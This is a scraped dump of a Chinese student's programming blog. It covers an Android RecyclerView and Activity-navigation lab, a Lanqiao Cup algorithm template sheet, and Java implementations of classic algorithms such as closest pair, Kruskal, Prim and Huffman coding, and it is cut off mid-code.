androidx.activity.result.ActivityResult;import androidx.activity.result.ActivityResultCallback;import androidx.activity.result.ActivityResultLauncher;import androidx.activity.result.contract.ActivityResultContracts;import androidx.annotation.NonNull;import androidx.recyclerview.widget.RecyclerView;import java.util.List;import java.util.Map;public class MyAdapter extends RecyclerView.Adapter &lt;MyAdapter.MyViewHolder&gt;{    //定义存储数据和运行环境的变量    private List&lt;Map&lt;String,Object&gt;&gt; mydata;    private Context mycontext;    //获取数据和运行环境    public MyAdapter(List&lt;Map&lt;String,Object&gt;&gt; data, Context context){        mydata=data;        mycontext=context;    }    @NonNull    @Override    public MyViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {        View view= LayoutInflater.from(mycontext).inflate(R.layout.fragment_txl,parent,false);        MyViewHolder holder=new MyViewHolder(view);        return holder;    }    @Override    public void onBindViewHolder(@NonNull MyAdapter.MyViewHolder holder, int position) {        String name=mydata.get(position).get(\"i_name\").toString();        int image=Integer.parseInt(mydata.get(position).get(\"i_image\").toString());        //获取详情页面中某个联系人的对应数据        String phone=mydata.get(position).get(\"i_phone\").toString();        String region=mydata.get(position).get(\"i_region\").toString();        String tag=mydata.get(position).get(\"i_tag\").toString();        holder.textView.setText(name);        holder.imageView.setImageResource(image);        //添加点击事件        holder.linearLayout_txl.setOnClickListener(new View.OnClickListener() {            @Override            public void onClick(View v) {                //点击后跳转到联系人详情页                Intent intent=new Intent(mycontext, txlDetails.class);                //使用bundle传值                Bundle bundle = new Bundle();                bundle.putString(\"details\",name);                bundle.putInt(\"image\", image);                bundle.putString(\"phone\",phone);                bundle.putString(\"region\",region);                bundle.putString(\"tag\",tag);                intent.putExtras(bundle);                mycontext.startActivity(intent);            }        });    }    @Override    public int getItemCount() {        return mydata.size();    }    public class MyViewHolder extends RecyclerView.ViewHolder {        public LinearLayout linearLayout_txl;        private TextView textView;        private ImageView imageView;        public MyViewHolder(@NonNull View itemView) {            super(itemView);            //获取item中的控件id            textView=itemView.findViewById(R.id.text_duihuakuang);            imageView=itemView.findViewById(R.id.image_touxiang);            linearLayout_txl=itemView.findViewById(R.id.linearLayout_txl);        }    }}\n\n跳转的实现主要是对于LinearLayout_txl 的点击动作实现一个监听，具体操作 Intent intent=new Intent(mycontext, txlDetails.class) myContext是一个代表当前Activity的上下文对象。txlDetails.class是目标Activity的类名。然后将数据压缩绑定到bundle里面，添加到intent，最后调用startActivity(intent) 进行跳转\n2.3 txlDetailspackage com.example.mywork;import androidx.appcompat.app.AppCompatActivity;import android.content.Intent;import android.os.Bundle;import android.util.Log;import android.view.View;import android.widget.Button;import android.widget.ImageView;import android.widget.TextView;public class txlDetails extends AppCompatActivity {    TextView dName,textView1,textView2,textView3;    ImageView dImage;    Button button_r;    @Override    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_txl_details);        //获取上一个Actvity传过来的intent        Intent intent=getIntent();        dName=findViewById(R.id.textDetail);        dImage=findViewById((R.id.imageDetail));        //根据intent获取得到的数据设置item控件的值        dImage.setImageResource(intent.getIntExtra(\"image\",R.drawable.find));        dName.setText(intent.getStringExtra(\"details\"));        textView1=findViewById(R.id.phone);        textView2=findViewById(R.id.region2);        textView3=findViewById(R.id.wxtag2);        textView1.setText(intent.getStringExtra(\"phone\"));        textView2.setText(intent.getStringExtra(\"region\"));        textView3.setText(intent.getStringExtra(\"tag\"));        button_r=findViewById(R.id.returnButton);        button_r.setOnClickListener(new View.OnClickListener() {            @Override            public void onClick(View view) {                Log.d(\"fb\",\"button_r....\");                Intent intent = new Intent();                setResult(777,intent);                finish();            }        });    }}\n\n用于接受来自txlFragment传过来的数据并显示数据，设置了返回button用于返回至跳转前的Activity\n结果展示\n代码仓库https://github.com/Kylinxin/MyWork\n总结​\t本次实现我完成了RecyclerView的实现，明白了如何对recyclerView进行传参，设置每一项的具体样子。同时对Activity跳转有了更清晰的认识，startActivity(intent);通过intent设置了跳转对象，进行跳转，这种方法简单直观，但是没办法处理返回值，老版本的解决方法是采用方法startActivityForResult()进行解决，但是有许多弊端和RequestCode难以处理，新版本中采用了registerForActivityResult()方法通过在使用registerForActivityResult()方法注册ActivityResultContracts.StartActivityForResult时，处理启动Activity并获取返回结果的逻辑。ActivityResultCallback是一个接口，用于处理ActivityResultLauncher的结果回调。当启动的Activity结束并返回结果时，回调方法中的ActivityResult参数将包含返回的结果信息。总的来说思路非常清晰，但是我也发现了一个问题，那就是在myadater中无法使用这种方式进行跳转，后来查找原因，registerForActivityResult()只能在fragment或activity中才能使用。这次收获满满，加深了我对recyclerView的使用和activity间跳转的用法和差异。\n—— 2023.11.7\n","categories":["实验"],"tags":["移动开发实验"]},{"title":"蓝桥杯","url":"/2023/04/09/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/","content":"救赎基础知识1.欧几里得辗转相除法 求解 最大公约数 最小公倍数int gcd(int a, int b){return b == 0 ? a : gcd(b, a % b);}int lcm(int a, int b){return a / gcd(a, b) * b;}\n\n2.求质数/* 判断素数 */bool isPrime(LL n) {\tfor (int i = 2; i * i &lt;= n; ++i)\t\tif (n % i == 0)\t\t\treturn false;\treturn true;}\n\n3.栈#include &lt;stack&gt;stack&lt;类型&gt; mystack;s.empty();         //如果栈为空则返回true, 否则返回false;s.size();          //返回栈中元素的个数s.top();           //返回栈顶元素, 但不删除该元素s.pop();           //弹出栈顶元素, 但不返回其值s.push();          //将元素压入栈顶\n\n4.队列#include &lt;queue&gt;queue&lt;类型&gt; myqueue;push() //在队尾插入一个元素pop() //删除队列第一个元素size() //返回队列中元素个数empty() //如果队列空则返回truefront() //返回队列中的第一个元素back() //返回队列中最后一个元素\n\n5.DFS(深度优先)int dx[4] = {0,0,-1,1};int dy[4] = {-1,1,0,0};int mp[N][N];//存放迷宫int vis[N][N];//表示是否访问过，初始为flasevoid DFS(int x, int y)\t//x,y是坐标点的位置 {\tif(vis[x][y] || (x==n &amp;&amp; y==n)) return; //表示已经访问过了或者到达终点,递归的出口\tvis[x][y] = true; //表示没有访问过，现在正在访问，置为访问过\tfor(int i=0; i &lt; 4; i++){\t//遍历四个方向，顺序依次是，上下左右\t\tint nx = x + dx[i];\t\tint ny = y + dy[i];      //进行了合法性检验，      //1.首先判断了该点是否越界，即是否在迷宫内  nx &gt; 0 &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; 0 &amp;&amp; ny &lt;= n      //2.然后判断是否访问过  !vis[nx][ny] 未访问过就继续      //3.最后判断是否为路  mp[nx][ny] == '0' 为路就继续\t\tif(nx &gt; 0 &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; 0 &amp;&amp; ny &lt;= n &amp;&amp; !vis[nx][ny] &amp;&amp; mp[nx][ny] == '0')\t\t\tdfs(nx,ny);\t} }//注意!! 应该判断一下起点是否可走\n\n6.BFS(广度优先搜索)int X[4]={0, 0, -1, 1};int Y[4]={-1, 1, 0, 0};int matrix[N][N]; //存储迷宫信息int vis[N][N];\t//存储每个状态点是否走过struct node{\tint x;\tint y;}Node, top;bool judge(int xx, int yy){\tif(xx&lt;0||yy&lt;0||xx&gt;=N||yy&gt;=N) //注意边界\t\treturn false;\tif(vis[xx][yy]==true||matrix[xx][yy]==0)\t//下一个点走过或者为墙 0不能走，1能走\t\treturn false;\treturn true;}void BFS(int x, int y){\tqueue&lt;node&gt; q;\tNode.x=x;\tNode.y=y;\tq.push(Node);\t//将起点入队列\twhile(!q.empty())\t//队列不空就扩散\t{\t\ttop=q.front();\t//取出队首元素\t\tint nx=top.x;\t\tint ny=top.y;\t//从四个方面机进行扩散         if(nx == ex &amp;&amp; ny == ey) //找到终点             return top;\t\tfor(int i=0; i&lt;4; i++)\t\t{\t\t\tif(judge(nx+X[i], ny+Y[i])) //检查四个方向，如果有路就进队列\t\t\t{\t\t\t\tNode.x=nx+X[i];\t\t\t\tNode.y=ny+Y[i];\t\t\t\tq.push(Node);\t\t\t\t}\t\t}\t\tans++;\t//计数器\t\tvis[nx][ny]=true;\t\tq.pop();\t//表示这个点的邻接点已经全部入队列，丢弃这个点\t}}\n\n7.二分模板/*    作者:FengBOOOOOOOOOOOOOOO    二分模板返回大于x的第一个位置    */#include&lt;cstdio&gt;#include&lt;algorithm&gt;#include&lt;cstring&gt;#define N 1005using namespace std;int a[N],n,q;int find(int l,int r,int key)//l为-1，r为数组长度{    while(l + 1 &lt; r)    {        int mid = l + r&gt;&gt;1;        if(a[mid] &lt;= key)        　　l = mid;        else        　　r = mid;    }    return r;//返回大于Key的第一个位置}int main(){    int k;    scanf(\"%d%d\",&amp;n,&amp;q);    for(int i = 0; i &lt; n; ++i)    　　scanf(\"%d\",&amp;a[i]);    for(int i = 0; i &lt; q; ++i)    {        scanf(\"%d\",&amp;k);        printf(\"%d\\n\",find(-1,n,k));    }} \n\n最短路径问题1.SPFA最短路径(类似与BFS)#include &lt;iostream&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;algorithm&gt;#include &lt;queue&gt;#include &lt;vector&gt;#define ll long long#define inf 0x3f3f3f3f#define pii pair&lt;int, int&gt;const int mod = 1e9+7;const int maxn = 2e5+7;using namespace std;struct node {int to,w,next;} edge[maxn];int head[maxn], cnt;int dis[maxn], vis[maxn];int n, m, s, t;struct Spfa{    void init()    {        memset(head,-1,sizeof(head));        memset(dis,0x3f3f3f3f,sizeof(dis));        memset(vis,0,sizeof(vis));        cnt = 0;    }     void add(int u,int v,int w)    {        edge[cnt].to = v;        edge[cnt].w = w;        edge[cnt].next = head[u];        head[u] = cnt ++;    }     void spfa()    {        dis[s] = 0; vis[s] = 1;        queue &lt;int&gt; Q; Q.push(s);        while(!Q.empty())        {            int now = Q.front();            Q.pop(); vis[now] = 0;    //从队列中弹出now , vis[now] 标记为未访问            for(int i = head[now]; i != -1; i = edge[i].next)            {                int v = edge[i].to;                if(dis[v] &lt; dis[now] + edge[i].w)                {                    dis[v] = dis[now] + edge[i].w;                    if(vis[v]) continue;    //如果访问过了(也就是 已经在队列中),就不用再push                    vis[v] = 1; Q.push(v);                }            }        }    }}sp; int main(){    while(~scanf(\"%d%d\",&amp;n,&amp;m) &amp;&amp; n+m)    {        sp.init();        for(int i = 0; i &lt; m; i++)        {            int u, v, w;            scanf(\"%d%d%d\",&amp;u, &amp;v, &amp;w);            sp.add(u, v, w);            sp.add(v, u, w);        }        s = 1, t = n; //s起点，t终点        sp.spfa();        printf(\"%d\\n\", dis[t]);    }}\n\n2.Dijkstra//主要思想一个大循环+两个小循环void dijkstra(){\tint u, minx;\tbook[S] = 1;\tfor(int i = 0; i &lt; N; i++){\t//dist[]数组初始化，把起始结点S到i结点的距离赋值给diat[i]\t\tdist[i] = v[S][i];\t}\tfor(int i = 0; i &lt; N; i++){//大循环\t\tminx = INT_MAX;\t\tfor(int j = 0; j &lt; N; j++){//寻找没有被标记并且最短的路径，并记录此结点 \t\t\tif(!book[j] &amp;&amp; minx &gt; dist[j]){\t\t\t\tminx = dist[j];\t\t\t\tu = j;\t\t\t} \t\t}\t\tbook[u] = 1;\t\tfor(int k = 0; k &lt; N; k++){\t\t//如果A到B的距离大于A到C的距离加C到B的距离，那么更新数据\t\t\tif(!book[k] &amp;&amp; dist[k] &gt; dist[u]+v[u][k]){\t\t\t\tdist[k] = dist[u]+v[u][k];\t\t\t}\t\t}\t}}\n\n3.Floyd//初始化：    for (int i = 1; i &lt;= n; i ++ )        for (int j = 1; j &lt;= n; j ++ )            if (i == j) d[i][j] = 0;            else d[i][j] = INF;// 算法结束后，d[a][b]表示a到b的最短距离void floyd(){    for (int k = 1; k &lt;= n; k ++ )        for (int i = 1; i &lt;= n; i ++ )            for (int j = 1; j &lt;= n; j ++ )                d[i][j] = min(d[i][j], d[i][k] + d[k][j]);}\n\n\n\n","tags":["蓝桥杯刷题总结"]},{"title":"算法与程序设计实验","url":"/2023/10/31/%E7%AE%97%E6%B3%95%E4%B8%8E%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/","content":"算法与程序设计实验要求\n\n1.复现代码，写上自己的注释\n2.结果展示\n3.将代码进行修改，bug修改，内容提升\n\n第二章逆序计数import java.io.*;import java.util.*;public class Countlnversions {    public static void main(String[] args)    {        System.out.println(\"请输入待计数逆序的整数序列(以空格分开，各项值都不同)\");        Scanner in=new Scanner(System.in);        String line=in.nextLine();        String[] tokens=line.split(\" \");        //获取用户输入的序列        int[] S1=new int[tokens.length];        for(int i=0;i&lt;tokens.length;i++)            S1[i]=Integer.parseInt(tokens[i]);        int count=sortAndCount(S1);        //调用实现SAC算法的方法，返回计数结果        for (int i=0;i&lt;S1.length;i++)            System.out.print(S1[i]+\" \");        System.out.print(\"\\n逆序计数为：\"+count);        //显示排序后的序列和逆序计数值    }    private static int sortAndCount(int[]S){        if(S.length==1)            return 0;        int n=S.length/2;        int[] A=new int[n];        int[] B=new int[S.length-n];        int j=0;        for (int i=0;i&lt;A.length;i++)            A[i]=S[j++];        for (int i=0;i&lt;B.length;i++)            B[i]=S[j++];        int rA=sortAndCount(A);        int rB=sortAndCount(B);        int r=mergeAndCount(A,B,S);        return (r+rA+rB);    }    private static int mergeAndCount(int[]A,int[]B,int[]C)    {        int i=0,j=0,k=0,count=0;        while (i&lt;A.length&amp;&amp;j&lt;B.length)        {            if (A[i]&gt;B[j])            {                count+=A.length-i;                C[k++]=B[j++];            }            else {                C[k++]=A[i++];            }        }        if (i==A.length&amp;&amp;j&lt; B.length)            for (int l=j;l&lt; B.length;l++)                C[k++]=B[l];        if (i&lt; A.length&amp;&amp;j== B.length)            for (int l=i;l&lt; A.length;l++)                C[k++]=A[l];        return count;    }}\n\n\n\n寻找最近点对import java.util.Arrays;public class FindClosestPair {    public static void main(String[] args) {        int N=30;        int beishu=5000;        int[] x=new int[N];        int[] y=new int[N];        int[] p2=new int[4];        int[] x2=new int[N];        int[] y2=new int[N];        StdDraw.setXscale(0, beishu);        StdDraw.setYscale(0, beishu);        StdDraw.setPenRadius(0.005);        for(int i=0;i&lt;N;i++){            x[i]=(int)(Math.random()*beishu);            y[i]=(int)(Math.random()*beishu);            x2[i]=x[i];            y2[i]=y[i];        }        int[][] pX=new int[2][N];        int[][] pY=new int[2][N];        int[] flagX=new int[N];        int[] flagY=new int[N];        for(int i=0;i&lt;N;i++){            StdDraw.point(x[i], y[i]);            flagX[i]=1;            flagY[i]=1;        }        Arrays.sort(x);        Arrays.sort(y);        for(int i=0;i&lt;N;i++){            for(int j=0;j&lt;N;j++){                if(x[i]==x2[j]&amp;&amp;flagX[j]==1){                    pX[0][i]=x2[j];                    pX[1][i]=y2[j];                    flagX[j]=0;                }                if (y[i]==y2[j]&amp;&amp;flagY[j]==1){                    pY[0][i]=x2[j];                    pY[1][i]=y2[j];                    flagY[j]=0;                }            }        }        ClosestPairRec(pX,pY,p2);        System.out.println(p2[0]+\" \"+p2[1]+\" \"+p2[2]+\" \"+p2[3]);        StdDraw.setPenColor(StdDraw.RED);        StdDraw.line(p2[0], p2[1], p2[2], p2[3]);    }    public static void ClosestPairRec(int[][] pX, int[][] pY, int[] p2) {        if(pX[0].length&lt;=3){            if (pX[0].length==3){                int d1=(pX[0][0]-pX[0][1])* (pX[0][0]-pX[0][1])+(pX[1][0]-pX[1][1])* (pX[1][0]-pX[1][1]);                int d2=(pX[0][1]-pX[0][2])* (pX[0][1]-pX[0][2])+(pX[1][1]-pX[1][2])* (pX[1][1]-pX[1][2]);                int d3=(pX[0][0]-pX[0][2])* (pX[0][0]-pX[0][2])+(pX[1][0]-pX[1][2])* (pX[1][0]-pX[1][2]);                if(d1&gt;=d2&amp;&amp;d1&gt;=d3){                    p2[0]=pX[0][0];                    p2[1]=pX[1][0];                    p2[2]=pX[0][1];                    p2[3]=pX[1][1];                }                if(d2&gt;=d1&amp;&amp;d2&gt;=d3){                    p2[0]=pX[0][1];                    p2[1]=pX[1][1];                    p2[2]=pX[0][2];                    p2[3]=pX[1][2];                }                if(d3&gt;=d1&amp;&amp;d3&gt;=d2){                    p2[0]=pX[0][0];                    p2[1]=pX[1][0];                    p2[2]=pX[0][2];                    p2[3]=pX[1][2];                }            }            if(pX[0].length==2){                p2[0]=pX[0][0];                p2[1]=pX[1][0];                p2[2]=pX[0][1];                p2[3]=pX[1][1];            }            return;        }        int foreHalf = pX[0].length/2;        int[][] qX=new int[2][foreHalf];        int[][] qY=new int[2][foreHalf];        int[][] rX=new int[2][pX[0].length-foreHalf];        int[][] rY=new int[2][pX[0].length-foreHalf];        int[] qp2=new int[4];        int[] rp2=new int[4];        int k=0;        for(int i=0;i&lt;pX[0].length;i++){            if(i&lt;foreHalf) {                qX[0][i] = pX[0][i];                qX[1][i] = pX[1][i];                qY[0][i] = pY[0][i];                qY[1][i] = pY[1][i];            }            else{                rX[0][k] = pX[0][i];                rX[1][k] = pX[1][i];                rY[0][k] = pY[0][i];                rY[1][k] = pY[1][i];                k=k+1;            }        }        ClosestPairRec(qX,qY,qp2);        ClosestPairRec(rX,rY,rp2);        int dd1=(qp2[2]-qp2[0])* (qp2[2]-qp2[0])+(qp2[1]-qp2[3])* (qp2[1]-qp2[3]);        int dd2=(rp2[2]-rp2[0])* (rp2[2]-rp2[0])+(rp2[1]-rp2[3])* (rp2[1]-rp2[3]);        int d2=Math.min(dd2,dd1);        double d=Math.sqrt(d2);        if (dd1&lt;dd2){            p2[0]=qp2[0];            p2[1]=qp2[1];            p2[2]=qp2[2];            p2[3]=qp2[3];        }        else{            p2[0]=rp2[0];            p2[1]=rp2[1];            p2[2]=rp2[2];            p2[3]=rp2[3];        }        int[][] sY=new int[2][pX[0].length];        int count=0;        for(int i=0;i&lt;pX[0].length;i++){            if(pY[0][i]&gt;(pX[0][foreHalf-1]-d)&amp;&amp;pY[0][i]&lt;(pX[0][foreHalf-1]+d)){                sY[0][count]=pY[0][i];                sY[1][count]=pY[1][i];                count=count+1;            }        }        for (int i=0;i&lt;count;i++){            for(int j=1;j&lt;=15&amp;&amp;(j+1)&lt;count;j++){                int dl=(sY[0][i]-sY[0][i+j])* (sY[0][i]-sY[0][i+j])+(sY[1][i]-sY[1][i+j])* (sY[1][i]-sY[1][i+j]);                if(dl&lt;d2){                    d2=dl;                    p2[0]=sY[0][i];                    p2[1]=sY[1][i];                    p2[2]=sY[0][i+j];                    p2[3]=sY[1][i+j];                }            }        }    }}\n\n\n\n第三章时序分配//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//import java.util.Arrays;public class IntervarSchedulingDemo {    public IntervarSchedulingDemo() {    }    public static void main(String[] args) {        int isN = 10;        int gis = 50;        int[] isF = new int[isN];        int[] isS = new int[isN];        int[] isY = new int[isN];        int[] isF2 = new int[isN];        int[] isS2 = new int[isN];        int[] isY2 = new int[isN];        int[] isR = new int[isN];        int beishu = gis;        int[] flagX = new int[isN];        int c = 0;        int i;        int j;        while(c &lt; isN) {            i = (int)(Math.random() * (double)beishu);            j = (int)(Math.random() * (double)beishu);            int d3 = (int)(Math.random() * (double)beishu);            if (i &gt; j) {                isS[c] = j;                isF[c] = i;                isF2[c] = i;                isY[c] = d3;                isR[c] = 1;                flagX[c] = 1;                ++c;            }        }        StdDraw.setXscale(0.0, (double)beishu);        StdDraw.setYscale(0.0, (double)beishu);        StdDraw.setPenRadius(0.005);        Arrays.sort(isF);        for(i = 0; i &lt; isN; ++i) {            for(j = 0; j &lt; isN; ++j) {                if (isF[i] == isF2[j] &amp;&amp; flagX[j] == 1) {                    isS2[i] = isS[j];                    isY2[i] = isY[j];                    flagX[j] = 0;                    break;                }            }        }        for(c = 0; c &lt; isN; ++c) {            if (isR[c] == 1) {                for(i = c + 1; i &lt; isN; ++i) {                    if (isS2[i] &lt; isF[c]) {                        isR[i] = 0;                    }                }            }        }        for(i = 0; i &lt; isN; ++i) {            if (isR[i] == 1) {                StdDraw.setPenColor(StdDraw.RED);                StdDraw.line((double)isS2[i], (double)isY2[i], (double)isF[i], (double)isY2[i]);            } else {                StdDraw.setPenColor(StdDraw.BLACK);                StdDraw.line((double)isS2[i], (double)isY2[i], (double)isF[i], (double)isY2[i]);            }        }    }}\n\n\n\n最小生成树kruimport java.util.Arrays;public class KruskalDemo2{    public static void main(String[] arrays){        int VN=9,eN=17,count;        count=VN;        int[] cN=new int[VN];        int[] cS=new int[VN];        for(int i=0;i&lt;VN;i++){            cN[i]=i;            cS[i]=1;        }        int[] c=new int[eN];        int[] c2=new int[eN];        int[] flagEOG=new int[eN];        int[][]                e={{0,0,0,0,1,1,2,2,3,3,3,3,4,4,5,6,7},{1,4,3,2,6,4,3,5,4,8,7,5,6,8,7,8,8}};        int N=VN;        int beishu=9;        int[] x={4,1,7,4,2,8,1,6,3};        int[] y={0,1,1,3,4,4,6,6,8};        StdDraw.setXscale(0,beishu);        StdDraw.setYscale(0,beishu);        StdDraw.setPenRadius(0.005);        int v3;        int v4;        int[][] e2=new int[2][eN];        int[] flagX=new int[eN];        for(int i=0;i&lt;eN;i++)        {            v3=e[0][i];            v4=e[1][i];            flagX[i]=1;            c[i]=(x[v3]-x[v4])*(x[v3]-x[v4])-(y[v3]-y[v4])*(y[v3]-y[v4]);            c2[i]=c[i];            flagEOG[i]=0;        }        Arrays.sort(c);        for (int i=0;i&lt;eN;i++){            for (int j=0;j&lt;eN;j++){                if(c[i]==c2[j]&amp;&amp;flagX[j]==1){                    e2[0][i]=e[0][j];                    e2[1][i]=e[1][j];                    flagX[j]=0;                    break;                }            }        }        int clb=0;        while (count&gt;=1){            if (count==1){                for (int i=0;i&lt;=eN;i++){                    int v1,v2;                    v1=e2[0][i];                    v2=e2[1][i];                    if(flagEOG[i]==1){                        StdDraw.setPenColor(StdDraw.RED);                        StdDraw.line(x[v1],y[v1],x[v2],y[v2]);                    }                    else{                        StdDraw.setPenColor(StdDraw.BLACK);                        StdDraw.line(x[v1],y[v1],x[v2],y[v2]);                    }                }                break;            }            int szj1,szj2;            szj1=cN[e2[0][clb]];            szj2=cN[e2[1][clb]];            if(szj1!=szj2){                flagEOG[clb]=1;                count=count-1;                int dd,xd;                if (cS[szj1]&gt;=cS[szj2]){                    dd=szj1;                    xd=szj2;                }                else {                    dd=szj1;                    xd=szj2;                }                for(int k=0;k&lt;VN;k++){                    if(cN[k]==dd){                        cS[dd]=cS[dd]+cS[xd];                    }                }                for (int k=0;k&lt;VN;k++){                    if(cN[k]==xd){                        cN[k]=dd;                    }                }            }            clb=clb+1;        }    }}\n\nprimimport java.util.Arrays;public class PrimDemo {    public static void main(String[] args) {        int vN=9,eN=17,count;        count = vN;        int[] cN=new int[vN];        int[] cS=new int[vN];        for(int i=0;i&lt;vN;i++){            cN[i]=i;            cS[i]=1;        }        int[] c=new int[eN];        int[] c2=new int[eN];        int[] flagEOG=new int[eN];        int[] flagVOG=new int[vN];        for(int i=0;i&lt;vN;i++){            flagVOG[i]=0;        }        int[][] e ={{0,0,0,0,1,1,2,2,3,3,3,3,4,4,5,6,7},{1,4,3,2,6,4,3,5,4,8,7,5,6,8,7,8,8}};        int N=vN;        int beishu=9;        int[] x={4,1,7,4,2,8,1,6,3};        int[] y={0,1,1,3,4,4,6,6,8};        StdDraw.setXscale(0,beishu);        StdDraw.setYscale(0,beishu);        StdDraw.setPenRadius(0.005);        int v3;        int v4;        int[][] e2=new int[2][eN];        int[] flagX=new int[eN];        for(int i=0;i&lt;eN;i++){            v3=e[0][i];            v4=e[1][i];            flagX[i]=1;            c[i]=(x[v3]-x[v4])*(x[v3]-x[v4])+(y[v3]-y[v4])*(y[v3]-y[v4]);            c2[i]=c[i];            flagEOG[i]=0;        }        Arrays.sort(c);        for(int i=0;i&lt;eN;i++){            for(int j=0;j&lt;eN;j++){                if(c[i]==c2[j]&amp;&amp;flagX[j]==1){                    e2[0][i]=e[0][j];                    e2[1][i]=e[1][j];                    flagX[j]=0;                    break;                }            }        }        int fV=(int)(Math.random()*vN);        flagVOG[fV]=1;        int szj1,szj2;        while (count&gt;=1){            if(count==1){                for (int i=0;i&lt;eN;i++){                    int v1,v2;                    v1=e2[0][i];                    v2=e2[1][i];                    if(flagEOG[i]==1){                        StdDraw.setPenColor(StdDraw.RED);                        StdDraw.line(x[v1],y[v1],x[v2],y[v2]);                    }                    else {                        StdDraw.setPenColor(StdDraw.BLACK);                        StdDraw.line(x[v1],y[v1],x[v2],y[v2]);                    }                }                break;            }            for(int k=0;k&lt;eN;k++){                szj1=e2[0][k];                szj2=e2[1][k];                if(flagEOG[k]==0&amp;&amp;((flagVOG[szj2]==0&amp;&amp;flagVOG[szj1]==1)||(flagVOG[szj2]==1&amp;&amp;flagVOG[szj1]==0))){                    flagEOG[k]=1;                    if(flagVOG[szj2]==0){                        flagVOG[szj2]=1;                    }                    else {                        flagVOG[szj1]=1;                    }                    count--;                    break;                }            }        }    }}\n\n反向删除import java.util.Arrays;public class ReverseDeleteDemo {    public static void main(String[] args) {        int vN = 9, eN = 17, count;        count = vN;        int[] c = new int[eN];        int[] flagv = new int[vN];        int[] c2 = new int[eN];        int[] flagEOG = new int[eN];        int[][] e = {{0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 3, 3, 4, 4, 5, 6, 7}, {1, 4, 3, 2, 6, 4, 3, 5, 4, 8, 7, 5, 6, 8, 7, 8, 8}};        int[][] flag = new int[vN][vN];        int N = vN;        int beishu = 9;        int[] x = {4, 1, 7, 4, 2, 8, 1, 6, 3};        int[] y = {0, 1, 1, 3, 4, 4, 6, 6, 8};        StdDraw.setXscale(0, beishu);        StdDraw.setYscale(0, beishu);        StdDraw.setPenRadius(0.005);        int v3;        int v4;        int[][] e2 = new int[2][eN];        int[] flagX = new int[eN];        for (int i = 0; i &lt; eN; i++) {            v3 = e[0][i];            v4 = e[1][i];            flagX[i] = 1;            c[i] = (x[v3] - x[v4]) * (x[v3] - x[v4]) + (y[v3] - y[v4]) * (y[v3] - y[v4]);            c2[i] = c[i];            flagEOG[i] = 1;        }        Arrays.sort(c);        for (int i = 0; i &lt; eN; i++) {            flag[e[0][i]][e[1][i]] = 1;            flag[e[1][i]][e[0][i]] = 1;            for (int j = 0; j &lt; eN; j++) {                if (c[i] == c2[j] &amp;&amp; flagX[j] == 1) {                    e2[0][i] = e[0][j];                    e2[1][i] = e[1][j];                    flagX[j] = 0;                    break;                }            }        }        int szj1, szj2;        while (count &gt;= 1) {            if (count == 1) {                for (int i = 0; i &lt; eN; i++) {                    int v1, v2;                    v1 = e2[0][i];                    v2 = e2[1][i];                    if (flagEOG[i] == 1) {                        StdDraw.setPenColor(StdDraw.RED);                        StdDraw.line(x[v1], y[v1], x[v2], y[v2]);                    } else {                        StdDraw.setPenColor(StdDraw.BLACK);                        StdDraw.line(x[v1], y[v1], x[v2], y[v2]);                    }                }                break;            }            int cmN = 0;            for (int k = eN - 1; k &gt;= 0; k--) {                szj1 = e2[0][k];                szj2 = e2[1][k];                flag[szj1][szj2] = 0;                flag[szj2][szj1] = 0;                for (int i = 0; i &lt; vN; i++) {                    flagv[i] = 1;                }                cmN = dft(szj1, flag, flagv, vN);                if (cmN == vN) {                    flagEOG[k] = 0;                } else {                    flag[szj1][szj2] = 1;                    flag[szj2][szj1] = 1;                }            }            count = 1;        }    }    public static int dft(int v, int[][] flag, int[] flagv, int vN) {        int count=1;        flagv[v]=0;        for(int i=0;i&lt;vN;i++){            if(flag[v][i]==1&amp;&amp;flagv[i]==1){                count=count+dft(i,flag,flagv,vN);            }        }        return count;    }}\n\n\n\n第四章哈夫曼编码import java.util.*;public class HuffmanDemo {    public static void main(String[] args) {        int rr = 3;        //int count=10;        //char[] cS = {'a','b','c','d','e','f','g','h','i','j'};        //double[] dF={0.18,0.15,0.11,0.07,0.27,0.019,0.01,0.02,0.17,0.001};        int count = 7;        char[] cS = {'a', 'e', 'i', 's', 't', 'b', 'n'};        double[] dF = {0.1, 0.15, 0.12, 0.03, 0.04, 0.13, 0.01};        int[] dF2 = new int[count];        for (int i = 0; i &lt; count; i++) {            dF2[i] = (int) (dF[i] * 1000);        }        int[][] dPS = new int[3][count];        dPS[2][0] = 0;        for (int i = 0; i &lt; count; i++) {            dPS[0][i] = dF2[i];            dPS[1][i] = i;            insertHeap(dPS, i + 1);            dPS[2][0] = dPS[2][0] + 1;        }        int[][] cHT = new int[4][count * 2];        for (int i = 0; i &lt; count; i++) {            cHT[0][i] = i;            cHT[1][i] = -1;            cHT[2][i] = -1;            cHT[3][i] = 1;        }        int beishu = count * rr * 4;        StdDraw.setXscale(0, beishu);        StdDraw.setYscale(0, beishu);        StdDraw.setPenRadius(0.005);        int root = 0;        int n = count;        int count2 = count;        while (count &gt;= 1) {            if (count == 1) {                //输出显示哈夫曼树                inOrderPaint(root, cS, cHT, count2 * 5, count2 * 4 * rr - 10, rr, count2 * 1.9);                break;            }            int mF = dPS[1][0];            int f1 = dPS[0][0];            //从优先队列中取出频率最小的结点            dPS[0][0] = dPS[0][dPS[2][0]-1];            dPS[1][0] = dPS[1][dPS[2][0]-1];            //从优先队列最后结点放到第一个结点的位置            dPS[2][0] = dPS[2][0] - 1;            deleteHeap(dPS, 1);            //重新调整为新的优先队列            int mS = dPS[1][0];            int f2 = dPS[0][0];            dPS[0][0] = dPS[0][dPS[2][0] - 1];            dPS[1][0] = dPS[1][dPS[2][0] - 1];            dPS[2][0] = dPS[2][0] - 1;            deleteHeap(dPS, 1);            //从优先队列中取出频率次小的结点            cHT[0][n] = n;            cHT[1][n] = mF;            cHT[2][n] = mS;            if (cHT[3][mF] &gt; cHT[3][mS]) {                cHT[3][n] = cHT[3][mF] + 1;            }            dPS[0][dPS[2][0]] = f1 + f2;            dPS[1][dPS[2][0]] = n;            dPS[2][0] = 